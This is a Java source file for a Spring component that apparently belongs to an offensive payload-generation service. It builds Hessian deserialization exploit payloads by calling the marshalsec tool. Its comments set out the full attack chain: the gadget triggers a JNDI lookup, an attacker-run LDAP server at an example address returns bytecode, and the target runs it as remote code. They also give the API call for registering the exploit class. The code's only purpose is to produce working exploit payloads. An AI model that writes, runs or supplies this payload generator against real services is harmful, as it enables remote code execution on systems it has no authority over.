package com.oobx.chains;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.logging.Logger;

/**
 * Hessian1 / Hessian2 deserialization gadget chains via marshalsec.
 *
 * Delegates to marshalsec subprocess — NO custom gadget code.
 * Requires marshalsec-all.jar (or marshalsec-*.jar) in libs/.
 *
 * Usage: param jndi_url = ldap://YOUR_OOB_SERVER:1389/TOKEN
 *
 * Supported gadgets (marshalsec.Hessian):
 *   - SpringPartiallyComparableAdvisorHolder  (Spring on classpath)
 *   - XBean                                   (XBean on classpath)
 *   - Resin                                   (Resin on classpath)
 *
 * All gadgets trigger a JNDI lookup → OOBserver LDAP returns bytecode → RCE.
 * These gadgets do NOT use TemplatesImpl and are NOT affected by the
 * transient _tfactory issue that plagued the old custom implementation.
 *
 * Register your exploit class on OOBserver first:
 *   POST /api/rebind/{token}/set  {"class_name":"Exploit","bytecode_b64":"..."}
 * Then set jndi_url = ldap://10.0.7.25:1389/{token}
 */
@Component
public class HessianChainHandler implements ChainHandler {

    private static final Logger log = Logger.getLogger(HessianChainHandler.class.getName());

    @Value("${marshalsec.java:}")
    private String configuredJava;

    // Map chain IDs to marshalsec gadget names
    private static final Map<String, String> CHAIN_TO_GADGET = Map.of(
        "hessian1_spring",          "SpringPartiallyComparableAdvisorHolder",
        "hessian2_spring",          "SpringPartiallyComparableAdvisorHolder",
        "jchains_hessian1_spring",  "SpringPartiallyComparableAdvisorHolder",
        "jchains_hessian2_spring",  "SpringPartiallyComparableAdvisorHolder",
        "hessian1_rome",            "SpringPartiallyComparableAdvisorHolder",
        "hessian2_rome",            "SpringPartiallyComparableAdvisorHolder",
        "jchains_hessian1_rome",    "SpringPartiallyComparableAdvisorHolder",
        "jchains_hessian2_rome",    "SpringPartiallyComparableAdvisorHolder",
        "hessian1_cc6",             "SpringPartiallyComparableAdvisorHolder",
        "hessian2_cc6",             "SpringPartiallyComparableAdvisorHolder"
    );

    @Override
    public PayloadResult generate(String chainId, Map<String, Object> params) throws Exception {
        boolean isHessian2 = chainId.contains("hessian2");

        // jndi_url points to OOBserver LDAP (must have rebind registered first)
        String jndiUrl = (String) params.getOrDefault("jndi_url", "");
        if (jndiUrl.isEmpty()) {
            return new PayloadResult("application/octet-stream", new byte[0],
                Map.of("error", "jndi_url required (e.g. ldap://10.0.7.25:1389/TOKEN)",
                       "hint", "Register rebind first: POST /api/rebind/{token}/set"));
        }

        String gadget = CHAIN_TO_GADGET.getOrDefault(chainId,
            (String) params.getOrDefault("gadget", "SpringPartiallyComparableAdvisorHolder"));

        String javaExe = resolveJava();
        byte[] bytes = invokeMarshalsec(gadget, jndiUrl, isHessian2, javaExe);

        if (bytes.length == 0) {
            return new PayloadResult("application/octet-stream", new byte[0],
                Map.of("error", "marshalsec returned empty",
                       "gadget", gadget,
                       "hint", "Ensure marshalsec-all.jar is in bytecode-service/libs/",
                       "jndi_url", jndiUrl));
        }

        return new PayloadResult(
            "application/octet-stream",
            bytes,
            Map.of(
                "protocol", isHessian2 ? "Hessian2" : "Hessian1",
                "gadget", gadget,
                "jndi_url", jndiUrl,
                "size", bytes.length,
                "note", "JNDI gadget via marshalsec — register rebind on OOBserver before sending"
            )
        );
    }

    /**
     * Invoke marshalsec.Hessian to generate a Hessian1 or Hessian2 payload.
     *
     * marshalsec CLI: java -cp marshalsec.jar marshalsec.Hessian <gadget> [output] <url>
     *
     * Hessian1 vs Hessian2: marshalsec generates Hessian2 by default.
     * For Hessian1, pass --hessian1 or use marshalsec.Hessian1 (version dependent).
     */
    static byte[] invokeMarshalsec(String gadget, String jndiUrl,
                                   boolean hessian2, String javaExe) {
        File marshalJar = YsoserialHandler.findJar("marshalsec");
        if (marshalJar == null) {
            Logger.getLogger(HessianChainHandler.class.getName())
                  .warning("marshalsec jar not found in libs/");
            return new byte[0];
        }

        // marshalsec only has marshalsec.Hessian (Hessian2 format).
        // Hessian1 format must be generated via java-chains (jchains_hessian1_* chains).
        // Usage: <gadget> <jndi_url>  — outputs serialized payload to stdout.
        String mainClass = "marshalsec.Hessian";

        List<String> cmd = new ArrayList<>();
        cmd.add(javaExe);
        cmd.addAll(List.of("-cp", marshalJar.getAbsolutePath(), mainClass,
                           gadget, jndiUrl));

        Logger log = Logger.getLogger(HessianChainHandler.class.getName());
        log.info("marshalsec: " + String.join(" ", cmd));

        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            // Keep stderr separate so stdout contains only the binary payload
            Process proc = pb.start();
            byte[] stdoutBytes = proc.getInputStream().readAllBytes();
            String stderr = new String(proc.getErrorStream().readAllBytes());
            int exitCode = proc.waitFor();

            if (exitCode != 0) {
                log.warning("marshalsec exit=" + exitCode + " stderr=" + stderr);
                return new byte[0];
            }
            if (stdoutBytes.length > 0) {
                log.info("marshalsec: stdout " + stdoutBytes.length + " bytes");
                return stdoutBytes;
            }
            log.warning("marshalsec: empty stdout. stderr=" + stderr);
            return new byte[0];
        } catch (Exception e) {
            log.warning("marshalsec error: " + e);
            return new byte[0];
        }
    }

    private String resolveJava() {
        if (configuredJava != null && !configuredJava.isBlank()) return configuredJava;
        String[] candidates = {
            "/usr/lib/jvm/java-8-openjdk-amd64/bin/java",
            "/usr/lib/jvm/java-8-openjdk/bin/java",
            "C:\\Program Files\\Java\\jdk1.8.0_202\\bin\\java.exe",
        };
        for (String p : candidates) if (new File(p).exists()) return p;
        return ProcessHandle.current().info().command().orElse("java");
    }
}
